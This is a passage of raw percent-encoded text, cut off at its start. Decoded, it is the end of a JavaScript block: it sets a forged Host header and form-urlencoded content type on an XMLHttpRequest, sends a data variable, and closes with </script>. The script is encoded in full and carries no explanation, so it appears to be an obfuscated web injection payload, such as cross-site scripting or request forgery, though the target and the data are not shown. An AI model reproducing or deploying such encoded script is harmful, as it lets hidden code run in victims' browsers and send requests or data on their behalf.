%2c%20%74%72%75%65%29%3b%0a%09%09%6c%58%4d%4c%48%54%54%50%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%22%48%6f%73%74%22%2c%20%6c%48%6f%73%74%29%3b%20%0a%09%09%6c%58%4d%4c%48%54%54%50%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%22%43%6f%6e%74%65%6e%74%2d%54%79%70%65%22%2c%20%22%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%22%29%3b%09%09%09%0a%09%09%6c%58%4d%4c%48%54%54%50%2e%73%65%6e%64%28%6c%44%61%74%61%29%3b%0a%0a%09%7d%63%61%74%63%68%28%65%29%7b%0a%09%09%61%6c%65%72%74%28%65%2e%6d%65%73%73%61%67%65%29%3b%2f%2a%46%6f%72%20%74%65%73%74%69%6e%67%20%6f%6e%6c%79%2a%2f%0a%09%7d%20%0a%3c%2f%73%63%72%69%70%74%3e%0a
